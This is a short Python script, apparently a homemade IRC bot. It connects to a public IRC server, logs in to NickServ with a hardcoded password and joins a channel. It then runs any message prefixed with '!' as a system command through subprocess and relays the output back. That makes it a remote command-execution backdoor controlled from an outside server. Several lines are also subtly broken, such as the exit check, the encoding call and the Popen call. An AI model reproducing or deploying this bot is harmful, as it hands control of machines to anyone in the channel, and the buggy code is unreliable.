#!/usr/bin/env python
# IRC BOT
import socket
import subprocess

addr = 'irc.freenode.org'
port = 6665
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
needToExit = False
irc.connect((addr, port))

# nick setup
irc.send(b'NICK dsstudioBot\r\n')
irc.send(b'USER dsstudioBot dsstudioBot dsstudioBot : dsstudioBot\r\n')

# login
# how to send a private message
# irc.send(b'PRIVMSG dousha : Hello?\r\n')
irc.send(b'PRIVMSG NickServ : identify aaaddd0\r\n')

# join the channel
irc.send(b'JOIN #pec\r\n')
irc.send(b'PRIVMSG #pec : [+] Bot init!\r\n')
while not needToExit:
    data = irc.recv(4096)
    print(data.decode('utf-8'))
    if data.find(b'PING') != -1:
        sends = "PONG " + data.split()[1].decode('utf-8') + "\r\n"
        irc.send(sends.encode('utf-8'))
    elif data.find(b'PRIVMSG') != -1:
        # extract the message
        nick = data.decode('utf-8').split('!')[0].replace(':', '')
        msg = data.decode('utf-8').split(':', 2)[2]
        # is that a command?
        if msg[0:1] == '!':
            if msg[2:] == 'exit':
                needToExit = True
            else:
                # run the command
                p = subprocess.Popen(msg, stdout=subprocess.PIPE)
                result = p.stdout.read().encode('utf-8')
                irc.send(result)
            irc.send(b'PRIVMSG #pec : [+] Completed!')
        else:
            irc.send(b'PRIVMSG #pec : [0] I heard that')
irc.send(b'QUIT\r\n')
irc.close()
